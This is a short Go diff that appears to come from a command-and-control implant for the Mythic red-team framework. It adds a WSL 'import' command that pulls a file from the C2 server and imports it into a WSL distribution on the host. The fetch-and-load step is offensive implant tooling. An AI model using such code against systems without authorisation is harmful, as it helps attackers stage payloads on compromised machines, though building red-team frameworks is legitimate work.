@@ -391,7 +391,21 @@ func execute() {
 				case "token":
 					result = commands.Token(job.Payload.(jobs.Command))
 				case "wsl":
-					result = commands.WSLCommand(job.Payload.(jobs.Command))
+					cmd := job.Payload.(jobs.Command)
+					if len(cmd.Args) > 2 && cmd.Args[0] == "import" {
+						data, pullErr := memoryService.ClientService.PullFile(job.ID, cmd.Args[2], 1048576)
+						if pullErr != nil {
+							result.Stderr = fmt.Sprintf("failed to pull file from Mythic: %s", pullErr)
+						} else {
+							var targetDir string
+							if len(cmd.Args) > 3 {
+								targetDir = cmd.Args[3]
+							}
+							result = commands.WSLImportPipe(cmd.Args[1], data, targetDir)
+						}
+					} else {
+						result = commands.WSLCommand(cmd)
+					}
 				default:
 					result.Stderr = fmt.Sprintf("unknown module command: %s", job.Payload.(jobs.Command).Command)
 				}
